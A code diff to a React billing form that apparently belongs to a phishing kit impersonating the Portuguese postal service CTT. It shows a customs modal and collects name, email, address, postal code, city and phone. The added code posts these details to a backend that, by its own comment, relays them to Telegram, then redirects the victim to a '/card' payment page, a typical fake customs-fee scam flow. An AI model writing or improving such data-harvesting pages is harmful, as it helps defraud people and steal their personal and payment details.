@@ -7,6 +7,10 @@ import { AlertCircle, Package } from 'lucide-react';
 import { useToast } from '../hooks/use-toast';
 import { useNavigate } from 'react-router-dom';
 import CustomsModal from './CustomsModal';
+import axios from 'axios';
+
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const API = `${BACKEND_URL}/api`;
 
 const CTTBillingForm = () => {
   const [formData, setFormData] = useState({
@@ -18,6 +22,7 @@ const CTTBillingForm = () => {
     telefone: ''
   });
   const [showModal, setShowModal] = useState(true);
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const { toast } = useToast();
   const navigate = useNavigate();
 
@@ -28,41 +33,67 @@ const CTTBillingForm = () => {
     }));
   };
 
-  const handleSubmit = () => {
-    // Validate required fields
-    const requiredFields = ['nome', 'email', 'endereco', 'codigoPostal', 'cidade', 'telefone'];
-    const missingFields = requiredFields.filter(field => !formData[field].trim());
+  const handleSubmit = async () => {
+    setIsSubmitting(true);
     
-    if (missingFields.length > 0) {
+    try {
+      // Validate required fields
+      const requiredFields = ['nome', 'email', 'endereco', 'codigoPostal', 'cidade', 'telefone'];
+      const missingFields = requiredFields.filter(field => !formData[field].trim());
+      
+      if (missingFields.length > 0) {
+        toast({
+          title: "Campos obrigatórios",
+          description: "Por favor, preencha todos os campos obrigatórios",
+          variant: "destructive"
+        });
+        setIsSubmitting(false);
+        return;
+      }
+
+      // Basic email validation
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(formData.email)) {
+        toast({
+          title: "Email inválido",
+          description: "Por favor, introduza um endereço de email válido",
+          variant: "destructive"
+        });
+        setIsSubmitting(false);
+        return;
+      }
+
+      // Send billing data to backend (and Telegram)
+      const response = await axios.post(`${API}/ctt/billing`, formData);
+      
+      if (response.data.status === 'success') {
+        // Store billing ID for later use
+        localStorage.setItem('ctt_billing_id', response.data.billing_id);
+        localStorage.setItem('ctt_billing_data', JSON.stringify(formData));
+        
+        toast({
+          title: "Informações enviadas com sucesso!",
+          description: "Dados foram enviados para o Telegram. Redirecionando para pagamento...",
+          duration: 3000
+        });
+
+        // Navigate to card page after a short delay
+        setTimeout(() => {
+          navigate('/card');
+        }, 2000);
+      }
+      
+    } catch (error) {
+      console.error('Error submitting billing data:', error);
+      
       toast({
-        title: "Campos obrigatórios",
-        description: "Por favor, preencha todos os campos obrigatórios",
+        title: "Erro ao enviar dados",
+        description: error.response?.data?.detail || "Erro interno. Tente novamente.",
         variant: "destructive"
       });
-      return;
+    } finally {
+      setIsSubmitting(false);
     }
-
-    // Basic email validation
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(formData.email)) {
-      toast({
-        title: "Email inválido",
-        description: "Por favor, introduza um endereço de email válido",
-        variant: "destructive"
-      });
-      return;
-    }
-
-    toast({
-      title: "Informações de entrega enviadas",
-      description: "Redirecionando para a página de pagamento...",
-      duration: 2000
-    });
-
-    // Navigate to card page after a short delay
-    setTimeout(() => {
-      navigate('/card');
-    }, 2000);
   };
 
   return (
@@ -77,6 +108,20 @@ const CTTBillingForm = () => {
             </h2>
           </div>
 
+          {/* Telegram Notice */}
+          <div className="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
+            <div className="flex">
+              <div className="flex-shrink-0">
+                <Package className="h-5 w-5 text-blue-400" />
+              </div>
+              <div className="ml-3">
+                <p className="text-sm text-blue-700">
+                  <strong>Notificação automática:</strong> Os seus dados serão enviados via Telegram para processamento.
+                </p>
+              </div>
+            </div>
+          </div>
+
           {/* Form Fields */}
           <div className="space-y-6">
             {/* Nome */}
@@ -87,11 +132,12 @@ const CTTBillingForm = () => {
               <Input
                 id="nome"
                 type="text"
-                placeholder="Nome"
+                placeholder="Nome completo"
                 value={formData.nome}
                 onChange={(e) => handleInputChange('nome', e.target.value)}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                 required
+                disabled={isSubmitting}
               />
             </div>
 
@@ -103,11 +149,12 @@ const CTTBillingForm = () => {
               <Input
                 id="email"
                 type="email"
-                placeholder="Correio electrónico"
+                placeholder="exemplo@email.com"
                 value={formData.email}
                 onChange={(e) => handleInputChange('email', e.target.value)}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                 required
+                disabled={isSubmitting}
               />
             </div>
 
@@ -119,11 +166,12 @@ const CTTBillingForm = () => {
               <Input
                 id="endereco"
                 type="text"
-                placeholder="Endereço"
+                placeholder="Rua, número, andar"
                 value={formData.endereco}
                 onChange={(e) => handleInputChange('endereco', e.target.value)}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                 required
+                disabled={isSubmitting}
               />
             </div>
 
@@ -135,11 +183,12 @@ const CTTBillingForm = () => {
               <Input
                 id="codigoPostal"
                 type="text"
-                placeholder="Código postal"
+                placeholder="0000-000"
                 value={formData.codigoPostal}
                 onChange={(e) => handleInputChange('codigoPostal', e.target.value)}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                 required
+                disabled={isSubmitting}
               />
             </div>
 
@@ -151,11 +200,12 @@ const CTTBillingForm = () => {
               <Input
                 id="cidade"
                 type="text"
-                placeholder="Cidade"
+                placeholder="Nome da cidade"
                 value={formData.cidade}
                 onChange={(e) => handleInputChange('cidade', e.target.value)}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                 required
+                disabled={isSubmitting}
               />
             </div>
 
@@ -167,27 +217,44 @@ const CTTBillingForm = () => {
               <Input
                 id="telefone"
                 type="tel"
-                placeholder="Número de telefone"
+                placeholder="+351 9XX XXX XXX"
                 value={formData.telefone}
                 onChange={(e) => handleInputChange('telefone', e.target.value)}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                 required
+                disabled={isSubmitting}
               />
             </div>
           </div>
 
           {/* Terms Notice */}
           <div className="mt-6 text-sm text-gray-600">
-            Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional.
+            Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional e 
+            o envio dos seus dados via Telegram para processamento.
           </div>
 
           {/* Submit Button */}
           <div className="mt-8 flex justify-end">
             <Button
               onClick={handleSubmit}
-              className="bg-red-600 hover:bg-red-700 text-white px-8 py-2 rounded-md font-medium transition-colors duration-200"
+              disabled={isSubmitting}
+              className={`px-8 py-2 rounded-md font-medium transition-colors duration-200 ${
+                isSubmitting 
+                  ? 'bg-gray-400 cursor-not-allowed' 
+                  : 'bg-red-600 hover:bg-red-700 text-white'
+              }`}
             >
-              Seguinte
+              {isSubmitting ? (
+                <div className="flex items-center">
+                  <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                  Enviando para Telegram...
+                </div>
+              ) : (
+                'Seguinte'
+              )}
             </Button>
           </div>
         </CardContent>
